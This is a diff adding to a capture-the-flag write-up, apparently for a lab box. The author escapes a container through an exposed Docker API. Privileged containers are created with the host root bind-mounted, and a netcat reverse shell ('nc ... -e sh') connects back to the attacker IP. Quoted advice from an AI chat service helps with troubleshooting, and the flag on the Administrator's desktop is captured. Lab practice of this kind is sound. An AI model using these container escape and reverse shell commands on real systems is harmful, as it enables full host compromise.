@@ -193,3 +193,143 @@ okay.
     curl http://192.168.65.7:2375/version
 
     curl -s http://192.168.65.7:2375/images/json
+
+
+### 3. escape!
+
+    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["sh","-c","cat /mnt/root/mnt/c/Users/Administrator/Desktop/root.txt"]}' http://192.168.65.7:2375/containers/create
+
+    {"Id":"46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808","Warnings":[]}
+
+#### start container and steal flag
+
+    curl -X POST http://192.168.65.7:2375/containers/46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808/start
+
+
+    curl http://192.168.65.7:2375/containers/46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808/logs?stdout=1
+
+
+not working, sadly. let's work w/ z.ai to get it to work.
+
+
+    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["ls","/mnt/root/mnt/c/Users"]}' http://192.168.65.7:2375/containers/create
+
+     f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c
+
+
+    curl -X POST http://192.168.65.7:2375/containers/<NEW_ID>/start
+    curl -X POST http://192.168.65.7:2375/containers/f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c/start
+
+    curl http://192.168.65.7:2375/containers/<NEW_ID>/logs?stdout=1
+    curl http://192.168.65.7:2375/containers/f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c/logs?stdout=1
+
+
+nope..
+
+
+from z.ai:
+
+    The empty logs suggest the path /mnt/c either doesn't exist on that specific WSL2 host or is empty. Since we only grabbed stdout=1, we didn't see the error message (which usually goes to stderr).
+
+
+    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["ls","/mnt/root"]}' http://192.168.65.7:2375/containers/create
+        {"Id":"70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324","Warnings":[]}
+
+    curl -X POST http://192.168.65.7:2375/containers/<NEW_ID>/start
+    curl -X POST http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/start
+
+    curl http://192.168.65.7:2375/containers/<NEW_ID>/logs?stdout=1
+    curl http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/logs?stdout=1
+
+
+```
+www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/logs?stdout=1
+<d581470a6471a0caa84a5342c15b186320324/logs?stdout=1
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   523    0   523    0     0  66974      0 --:--:-- --:--:-- --:--:-- 74714
+EFI
+bin
+boot
+bpf-legacy.o
+bpf.o
+
+containers
+dev
+
+dpkg.orig
+etc
+home
+host-network.o
+	host_mnt
+init
+lib
+lib64
+media
+mnt
+mutagen-file-shares
+mutagen-file-shares-mark
+opt
+parent-distro
+proc
+	pwatch.o
+root
+run
+sbin
+	services
+src
+srv
+sys
+tmp
+
+udpv6csum.o
+usr
+var
+www-data@821fbd6a43fa:~/html/cacti$ 
+```
+yay! our container prints to stdout.
+
+
+okay.
+
+so z.ai thinks we should use bind mounts to be able to get the root flag.
+
+the CTF guide i followed uses a different method, but let's be strange for abit an use bind mount.
+
+```z.ai
+Awesome progress! Seeing the file system layout is the breakthrough.
+
+I notice there is a root folder in that list. On a Linux system, the root user's personal files are stored in /root. Since you mounted the host's root to /mnt/root, the path to the root flag is likely /mnt/root/root/root.txt.
+
+Let's try reading that.
+```
+
+
+    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["cat","/mnt/root/root/root.txt"]}' http://192.168.65.7:2375/containers/create
+    {"Id":"5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631","Warnings":[]}
+
+    curl -X POST http://192.168.65.7:2375/containers/5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631/start
+    curl http://192.168.65.7:2375/containers/5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631/logs?stdout=1
+
+nope. i think we should just copy @Root_Fabric method.
+
+
+```bash
+    ip a # gives us 10.10.14.175 for attacker ip
+    nc -nvlp 4455 # run as attacker
+
+    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["sh","-c","nc 10.10.14.175 4455 -e sh"]}' http://192.168.65.7:2375/containers/create
+    {"Id":"4921307fdf5caec595d281a6e2828a4a5ed0f888e3ec66f6d9deda6683dd631c","Warnings":[]}
+
+    curl -X POST http://192.168.65.7:2375/containers/4921307fdf5caec595d281a6e2828a4a5ed0f888e3ec66f6d9deda6683dd631c/start
+
+```
+
+
+we are root! but mount seems empty sadly.
+
+
+ls /mnt/root/mnt/host/c/Users/Administrator/Desktop/root.txt
+cat /mnt/root/mnt/host/c/Users/Administrator/Desktop/root.txt
+
+yes!!!!!!! yayaaaaa!!!!!!!
